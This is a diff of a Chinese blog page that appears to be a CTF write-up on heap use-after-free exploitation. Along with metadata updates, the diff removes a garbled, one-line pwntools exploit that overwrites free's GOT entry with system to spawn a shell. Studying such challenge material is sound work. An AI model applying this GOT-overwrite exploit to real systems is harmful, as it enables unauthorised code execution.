@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/130.jpg">
 <meta property="article:published_time" content="2024-10-01T13:18:46.000Z">
-<meta property="article:modified_time" content="2024-10-05T13:36:44.084Z">
+<meta property="article:modified_time" content="2024-10-13T12:21:10.280Z">
 <meta property="article:author" content="清风">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          905 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          10 分钟
+          8 分钟
         
       </span>
     
@@ -314,7 +314,6 @@
 <p><img src="/img/UAF/n.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p><img src="/img/UAF/o.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>可以看到chunk已经被free掉了，但是对应的指针还没有</p>
-<p>xxxxxxxxxx from pwn import*io&#x3D;process(‘.&#x2F;heapcreator’)#io&#x3D;remote(‘node5.buuoj.cn’,’27684’)context(arch&#x3D;’amd64’,os&#x3D;’linux’,log_level&#x3D;’debug’)elf&#x3D;ELF(‘.&#x2F;heapcreator’)libc&#x3D;ELF(‘.&#x2F;libc-2.23.so’)free&#x3D;elf.got[‘free’]def creat(size,payload):    io.recvuntil(“Your choice :”)    io.sendline(‘1’)    io.recvuntil(“Size of Heap : “)    io.sendline(str(size))    io.recvuntil(“Content of heap:”)    io.sendline(payload)def edit(index,content):    io.recvuntil(“Your choice :”)    io.sendline(‘2’)    io.recvuntil(“Index :”)    io.sendline(str(index))    io.recvuntil(“Content of heap : “)    io.sendline(content)def printf(index):    io.recvuntil(“Your choice :”)    io.sendline(‘3’)    io.recvuntil(“Index :”)    io.sendline(str(index))def delete(index):    io.recvuntil(“Your choice :”)    io.sendline(‘4’)    io.recvuntil(“Index :”)    io.sendline(str(index))#gdb.attach(io)payload&#x3D;’&#x2F;bin&#x2F;sh\x00’payload&#x3D;payload.ljust(0x18,’a’)creat(24,payload)py2&#x3D;b’a’*16creat(16,py2)py3&#x3D;’&#x2F;bin&#x2F;sh\x00’py3&#x3D;py3.ljust(0x18,’a’)+’\x41’edit(0,py3)delete(1)creat(0x30,p64(0)*4 +p64(0x30) +  p64(free)) #printf(1)real&#x3D;u64(io.recvuntil(‘\x7f’)[-6:].ljust(8,b’\x00’))print(hex(real))printf(1)base&#x3D;real-libc.sym[‘free’]system&#x3D;base+libc.sym[‘system’]edit(1,p64(system))delete(0)io.interactive()#pause()python</p>
 <p>那么我们是否可以把print_note_content函数的地址覆盖成magic函数，再来调用print_note函数来getflag呢？(有点绕，请仔细理解一下），答案是肯定的。</p>
 <p>那么我们接下来的思路就是如何把print_note_content覆盖</p>
 <h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>这个程序中并没有编辑函数来让我们修改</p>
